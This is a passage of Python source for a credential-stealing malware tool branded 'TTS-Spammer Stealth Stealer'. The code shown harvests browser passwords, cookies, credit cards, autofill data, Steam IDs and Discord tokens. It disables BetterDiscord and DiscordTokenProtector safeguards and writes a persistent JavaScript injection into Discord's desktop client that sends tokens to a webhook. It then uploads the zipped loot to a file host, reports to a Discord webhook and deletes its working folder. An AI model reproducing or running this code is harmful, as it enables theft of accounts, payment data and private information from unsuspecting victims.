                                    game_files_found.append(f"{path_name}: {file_count} files")
                        except:
                            pass
                
                if game_files_found:
                    game_data.append(f"{game_name}: {', '.join(game_files_found)}")
            

            try:
                steam_config = os.path.join("C:", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.exists(steam_config):
                    with open(steam_config, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()

                        steam_ids = re.findall(r'7656[0-9]{13}', content)
                        if steam_ids:
                            steam_dest = os.path.join(self.d, "game_Steam")
                            if not os.path.exists(steam_dest):
                                os.makedirs(steam_dest)
                            
                            with open(os.path.join(steam_dest, "steam_accounts.txt"), "w") as f:
                                f.write("STEAM ACCOUNT IDS:\n")
                                f.write("=" * 30 + "\n")
                                for steam_id in set(steam_ids):
                                    f.write(f"Steam ID: {steam_id}\n")
                                    f.write(f"Profile URL: https://steamcommunity.com/profiles/{steam_id}\n\n")
                            
                            if "Steam:" not in str(game_data):
                                game_data.append(f"Steam: {len(set(steam_ids))} account IDs found")
            except:
                pass
            
            self.ga = game_data
            

            if game_data:
                try:
                    with open(os.path.join(self.d, "gaming_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("GAMING ACCOUNT STEALER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for game_info in game_data:
                            f.write(f"{game_info}\n")
                        f.write(f"\nTotal Games found: {len(game_data)}\n")
                except:
                    pass
        except:
            pass

    def discord_inject(self):
        try:
            injection_data = []
            

            discord_paths = [
                os.path.join(os.getenv("LOCALAPPDATA"), "discord"),
                os.path.join(os.getenv("LOCALAPPDATA"), "discordcanary"),
                os.path.join(os.getenv("LOCALAPPDATA"), "discordptb"),
                os.path.join(os.getenv("LOCALAPPDATA"), "discorddevelopment")
            ]
            

            try:
                bd_path = os.path.join(os.getenv("APPDATA"), "BetterDiscord", "data", "betterdiscord.asar")
                if os.path.exists(bd_path):
                    with open(bd_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    

                    modified_content = content.replace('api/webhooks', 'HackedByK4itrun')
                    
                    with open(bd_path, 'w', encoding='utf-8') as f:
                        f.write(modified_content)
                    
                    injection_data.append("BetterDiscord bypassed")
            except:
                pass
            

            try:
                dtp_dir = os.path.join(os.getenv("APPDATA"), "DiscordTokenProtector")
                dtp_config = os.path.join(dtp_dir, "config.json")
                

                try:
                    result = subprocess.run(['tasklist'], capture_output=True, text=True)
                    if 'discordtokenprotector' in result.stdout.lower():
                        subprocess.run(['taskkill', '/F', '/IM', 'DiscordTokenProtector.exe'], capture_output=True)
                        injection_data.append("DiscordTokenProtector process killed")
                except:
                    pass
                

                dtp_files = ['DiscordTokenProtector.exe', 'ProtectionPayload.dll', 'secure.dat']
                for file in dtp_files:
                    file_path = os.path.join(dtp_dir, file)
                    try:
                        if os.path.exists(file_path):
                            os.remove(file_path)
                            injection_data.append(f"Deleted {file}")
                    except:
                        pass
                

                if os.path.exists(dtp_config):
                    try:
                        with open(dtp_config, 'r', encoding='utf-8') as f:
                            config = json.load(f)
                        

                        config.update({
                            "k4itrun_is_here": "https://discord.gg/XS6btuuUR7",
                            "auto_start": False,
                            "auto_start_discord": False,
                            "integrity": False,
                            "integrity_allowbetterdiscord": False,
                            "integrity_checkexecutable": False,
                            "integrity_checkhash": False,
                            "integrity_checkmodule": False,
                            "integrity_checkscripts": False,
                            "integrity_checkresource": False,
                            "integrity_redownloadhashes": False,
                            "iterations_iv": 364,
                            "iterations_key": 457,
                            "version": 69420
                        })
                        
                        with open(dtp_config, 'w', encoding='utf-8') as f:
                            json.dump(config, f, indent=2)
                        

                        with open(dtp_config, 'a', encoding='utf-8') as f:
                            f.write('\n\n//k4itrun_is_here | https://discord.gg/XS6btuuUR7')
                        
                        injection_data.append("DiscordTokenProtector config modified")
                    except:
                        pass
            except:
                pass
            

            for discord_path in discord_paths:
                if os.path.exists(discord_path):
                    try:

                        app_dirs = [d for d in os.listdir(discord_path) if d.startswith('app-') and os.path.isdir(os.path.join(discord_path, d))]
                        
                        for app_dir in app_dirs:
                            app_path = os.path.join(discord_path, app_dir)
                            modules_path = os.path.join(app_path, "modules")
                            
                            if os.path.exists(modules_path):

                                core_dirs = [d for d in os.listdir(modules_path) if d.startswith('discord_desktop_core-') and os.path.isdir(os.path.join(modules_path, d))]
                                
                                for core_dir in core_dirs:
                                    core_path = os.path.join(modules_path, core_dir, "discord_desktop_core")
                                    
                                    if os.path.exists(core_path):

                                        injection_dir = os.path.join(core_path, "aurathemes")
                                        if not os.path.exists(injection_dir):
                                            os.makedirs(injection_dir)
                                        

                                        injection_code = f'''
const {{ BrowserWindow, session }} = require('electron');
const path = require('path');
const fs = require('fs');

// Token Monitoring
let currentToken = null;

const extractToken = () => {{
    try {{
        const tokenRegex = /[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g;
        const localStorageData = session.defaultSession.webContents.executeJavaScript(
            "Object.keys(localStorage).map(key => localStorage.getItem(key)).join('')"
        );
        
        localStorageData.then(data => {{
            const tokens = data.match(tokenRegex);
            if (tokens && tokens.length > 0) {{
                const newToken = tokens[0];
                if (newToken !== currentToken) {{
                    currentToken = newToken;
                    sendTokenToWebhook(newToken);
                }}
            }}
        }}).catch(() => {{}});
    }} catch (e) {{}}
}};

const sendTokenToWebhook = (token) => {{
    try {{
        const https = require('https');
        const data = JSON.stringify({{
            embeds: [{{
                title: "Discord Token Intercepted",
                description: "Token: " + token,
                color: 0xff0000,
                timestamp: new Date().toISOString()
            }}]
        }});
        
        const url = new URL("{self.w}");
        const options = {{
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }}
        }};
        
        const req = https.request(options);
        req.write(data);
        req.end();
    }} catch (e) {{}}
}};

// Monitor Token alle 30 Sekunden
setInterval(extractToken, 30000);

// Original Discord Code
module.exports = require('./core.asar');
'''
                                        

                                        index_js_path = os.path.join(core_path, "index.js")
                                        try:
                                            with open(index_js_path, 'w', encoding='utf-8') as f:
                                                f.write(injection_code)
                                            
                                            discord_name = os.path.basename(discord_path)
                                            injection_data.append(f"Injected {discord_name}")
                                        except:
                                            pass
                    except:
                        pass
            
            self.di = injection_data
            

            if injection_data:
                try:
                    with open(os.path.join(self.d, "discord_injection.txt"), "w", encoding="utf-8") as f:
                        f.write("DISCORD INJECTION RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for injection_info in injection_data:
                            f.write(f"{injection_info}\n")
                        f.write(f"\nTotal Injections: {len(injection_data)}\n")
                        f.write("\nFeatures:\n")
                        f.write("- BetterDiscord Bypass\n")
                        f.write("- DiscordTokenProtector Bypass\n")
                        f.write("- Real-time Token Monitoring\n")
                        f.write("- Persistent JavaScript Injection\n")
                except:
                    pass
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f),
                "vpns_found": len(self.v),
                "games_found": len(self.ga)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:

            try:

                if self.p:
                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("CYBERSEALL BROWSER DATA SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
                        

                        passwords = [p for p in self.p if not p.startswith("COOKIE_") and not p.startswith("CREDIT_CARD") and not p.startswith("AUTOFILL_DATA")]
                        cookies = [p for p in self.p if p.startswith("COOKIE_")]
                        credit_cards = [p for p in self.p if p.startswith("CREDIT_CARD")]
                        autofill = [p for p in self.p if p.startswith("AUTOFILL_DATA")]
                        
                        f.write(f"STATISTICS:\n")
                        f.write(f"Browser Passwords: {len(passwords)}\n")
                        f.write(f"Session Cookies: {len(cookies)}\n")
                        f.write(f"Credit Cards: {len(credit_cards)}\n")
                        f.write(f"Autofill Data: {len(autofill)}\n")
                        f.write(f"Total Entries: {len(self.p)}\n\n")
                        
                        if passwords:
                            f.write("BROWSER PASSWORDS:\n")
                            f.write("-" * 40 + "\n")
                            for pwd in passwords:
                                f.write(pwd + "\n")
                            f.write("\n")
                        
                        if cookies:
                            f.write("SESSION COOKIES:\n")
                            f.write("-" * 40 + "\n")
                            for cookie in cookies:
                                f.write(cookie + "\n")
                            f.write("\n")
                        
                        if credit_cards:
                            f.write("CREDIT CARDS:\n")
                            f.write("-" * 40 + "\n")
                            for card in credit_cards:
                                f.write(card + "\n")
                            f.write("\n")
                        
                        if autofill:
                            f.write("AUTOFILL DATA:\n")
                            f.write("-" * 40 + "\n")
                            for auto in autofill:
                                f.write(auto + "\n")
                            f.write("\n")
                

                if self.vt:
                    with open(os.path.join(self.d, "token_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("DISCORD TOKEN SUMMARY\n")
                        f.write("=" * 60 + "\n\n")
                        
                        for i, token_info in enumerate(self.vt):
                            f.write(f"TOKEN #{i+1}:\n")
                            f.write(f"Username: {token_info.get('username', 'Unknown')}#{token_info.get('discriminator', '0000')}\n")
                            f.write(f"Email: {token_info.get('email', 'Hidden')}\n")
                            f.write(f"Phone: {token_info.get('phone', 'None')}\n")
                            f.write(f"Nitro: {token_info.get('has_nitro', False)} ({token_info.get('nitro_days_left', 0)} days left)\n")
                            f.write(f"MFA: {token_info.get('mfa_enabled', False)}\n")
                            f.write(f"Verified: {token_info.get('verified', False)}\n")
                            f.write(f"Premium: {token_info.get('premium_type', 0)}\n")
                            f.write(f"Token: {token_info['token']}\n")
                            f.write("-" * 50 + "\n\n")
                

                with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
                    f.write("TTS-Spammer Stealth Stealer\n")
                    f.write("=" * 60 + "\n\n")
                    f.write("FINAL STATISTICS:\n")
                    f.write(f"Browser Passwords: {len(self.p)}\n")
                    f.write(f"Browser History: {len(self.h)}\n")
                    f.write(f"Autofill Data: {len(self.af)}\n")
                    f.write(f"Browser Cookies: {len(self.co)}\n")
                    f.write(f"Raw Tokens: {len(set(self.t))}\n")
                    f.write(f"Valid Tokens: {len(self.vt)}\n")
                    f.write(f"Keyword Files: {len(self.f)}\n")
                    f.write(f"VPN Configurations: {len(self.v)}\n")
                    f.write(f"Gaming Accounts: {len(self.ga)}\n")
                    f.write(f"Discord Injections: {len(self.di)}\n\n")
                    f.write("TARGET INFORMATION:\n")
                    f.write(f"User: {getpass.getuser()}\n")
                    f.write(f"Computer: {os.getenv('COMPUTERNAME', 'Unknown')}\n")
                    f.write(f"Platform: {platform.platform()}\n")
                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 60 + "\n")
            except:
                pass
            
            # Erstelle organisierte Ordnerstruktur
            try:
                # Browser Data Ordner
                browser_dir = os.path.join(self.d, "01_Browser_Data")
                if not os.path.exists(browser_dir):
                    os.makedirs(browser_dir)
                
                # Discord Data Ordner
                discord_dir = os.path.join(self.d, "02_Discord_Data")
                if not os.path.exists(discord_dir):
                    os.makedirs(discord_dir)
                
                # Gaming Data Ordner
                gaming_dir = os.path.join(self.d, "03_Gaming_Data")
                if not os.path.exists(gaming_dir):
                    os.makedirs(gaming_dir)
                
                # VPN Data Ordner
                vpn_dir = os.path.join(self.d, "04_VPN_Data")
                if not os.path.exists(vpn_dir):
                    os.makedirs(vpn_dir)
                
                # Files Data Ordner
                files_dir = os.path.join(self.d, "05_Files_Data")
                if not os.path.exists(files_dir):
                    os.makedirs(files_dir)
                
                # Verschiebe Browser-Dateien
                browser_files = ["passwords.txt", "browser_history.txt", "autofill_data.txt", "cookies.txt", "cookies.json", "browser_summary.txt"]
                for file in browser_files:
                    src = os.path.join(self.d, file)
                    if os.path.exists(src):
                        dst = os.path.join(browser_dir, file)
                        shutil.move(src, dst)
                
                # Verschiebe Discord-Dateien
                discord_files = ["valid_tokens.json", "discord_injection.txt", "token_summary.txt"]
                for file in discord_files:
                    src = os.path.join(self.d, file)
                    if os.path.exists(src):
                        dst = os.path.join(discord_dir, file)
                        shutil.move(src, dst)
                
                # Verschiebe Gaming-Dateien
                gaming_files = ["gaming_summary.txt"]
                for file in gaming_files:
                    src = os.path.join(self.d, file)
                    if os.path.exists(src):
                        dst = os.path.join(gaming_dir, file)
                        shutil.move(src, dst)
                
                # Verschiebe VPN-Dateien
                vpn_files = ["vpn_summary.txt"]
                for file in vpn_files:
                    src = os.path.join(self.d, file)
                    if os.path.exists(src):
                        dst = os.path.join(vpn_dir, file)
                        shutil.move(src, dst)
                
                # Verschiebe andere Dateien
                other_files = ["files.txt", "system_info.json", "GRABBER_STATISTICS.txt"]
                for file in other_files:
                    src = os.path.join(self.d, file)
                    if os.path.exists(src):
                        dst = os.path.join(files_dir, file)
                        shutil.move(src, dst)
                
                # Verschiebe Game-Ordner
                for item in os.listdir(self.d):
                    item_path = os.path.join(self.d, item)
                    if os.path.isdir(item_path) and item.startswith("game_"):
                        dst = os.path.join(gaming_dir, item)
                        shutil.move(item_path, dst)
                
                # Verschiebe VPN-Ordner
                for item in os.listdir(self.d):
                    item_path = os.path.join(self.d, item)
                    if os.path.isdir(item_path) and item.startswith("vpn_"):
                        dst = os.path.join(vpn_dir, item)
                        shutil.move(item_path, dst)
                
                # Verschiebe File-Dateien
                for item in os.listdir(self.d):
                    item_path = os.path.join(self.d, item)
                    if os.path.isfile(item_path) and (item.startswith("file_") or item.startswith("crypto_")):
                        dst = os.path.join(files_dir, item)
                        shutil.move(item_path, dst)
                
            except:
                pass
            

            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            arc_name = os.path.relpath(fp, self.d)
                            zf.write(fp, arc_name)
            

            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:

            total_passwords = len(self.p)
            total_tokens = len(set(self.t))
            valid_tokens = len(self.vt)
            total_files = len(self.f)
            total_vpns = len(self.v)
            total_games = len(self.ga)
            total_history = len(self.h)
            total_autofill = len(self.af)
            total_cookies = len(self.co)
            total_injections = len(self.di)
            

            embed_fields = [
                {
                    "name": "TTS-Spammer Stealth Stealer",
                    "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nBrowser Cookies: {total_cookies}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
                    "inline": False
                },
                {
                    "name": "Target System",
                    "value": f"```User: {getpass.getuser()}\nComputer: {os.getenv('COMPUTERNAME', 'Unknown')}\nPlatform: {platform.platform()}```",
                    "inline": False
                }
            ]
            

            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:3]):
                    username = token_info.get('username', 'Unknown')
                    discriminator = token_info.get('discriminator', '0000')
                    email = token_info.get('email', 'Hidden')
                    phone = token_info.get('phone', 'None')
                    has_nitro = token_info.get('has_nitro', False)
                    nitro_days = token_info.get('nitro_days_left', 0)
                    mfa = token_info.get('mfa_enabled', False)
                    verified = token_info.get('verified', False)
                    premium = token_info.get('premium_type', 0)
                    token = token_info['token']
                    ip = token_info.get('ip', 'Unknown')
                    pc_username = token_info.get('pc_username', 'Unknown')
                    pc_name = token_info.get('pc_name', 'Unknown')
                    
                    embed_fields.append({
                        "name": f"🎭 Discord Token #{i+1}",
                        "value": f"```👤 User: {username}#{discriminator}\n📧 Email: {email}\n📱 Phone: {phone}\n💎 Nitro: {has_nitro} ({nitro_days} days)\n🔐 MFA: {mfa} | ✅ Verified: {verified}\n🌐 IP: {ip}\n💻 PC: {pc_username}@{pc_name}\n🎫 Token: {token[:50]}...```",
                        "inline": False
                    })
            

            if total_passwords > 0:

                browser_stats = {}
                for pwd_entry in self.p:
                    browser = pwd_entry.split(" |")[0]
                    if browser not in browser_stats:
                        browser_stats[browser] = 0
                    browser_stats[browser] += 1
                
                browser_summary = []
                for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    browser_summary.append(f"{browser}: {count}")
                
                embed_fields.append({
                    "name": "Browser Breakdown",
                    "value": f"```{chr(10).join(browser_summary)}```",
                    "inline": False
                })
            

            if total_vpns > 0:
                vpn_summary = []
                for vpn_info in self.v[:5]:
                    vpn_summary.append(vpn_info)
                
                embed_fields.append({
                    "name": "VPN Configurations",
                    "value": f"```{chr(10).join(vpn_summary)}```",
                    "inline": False
                })
            

            if total_games > 0:
                game_summary = []
                for game_info in self.ga[:5]:
                    game_summary.append(game_info)
                
                embed_fields.append({
                    "name": "Gaming Accounts",
                    "value": f"```{chr(10).join(game_summary)}```",
                    "inline": False
                })
            
            # Cookie Summary
            if total_cookies > 0:
                cookie_stats = {}
                for cookie in self.co:
                    browser = cookie['browser']
                    if browser not in cookie_stats:
                        cookie_stats[browser] = 0
                    cookie_stats[browser] += 1
                
                cookie_summary = []
                for browser, count in sorted(cookie_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    cookie_summary.append(f"{browser}: {count}")
                
                embed_fields.append({
                    "name": "Browser Cookies",
                    "value": f"```{chr(10).join(cookie_summary)}```",
                    "inline": False
                })
            

            embed_fields.append({
                "name": "Download All Data",
                "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
                "inline": False
            })
            
            embed = {
                "embeds": [{
                    "title": "TTS-Spammer Stealth Stealer",
                    "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                    "color": 0xff0000,
                    "fields": embed_fields,
                    "footer": {"text": "TTS-Spammer Stealth - Browser, History, Autofill, Cookies, VPN, Gaming & Discord Stealer"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass


if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
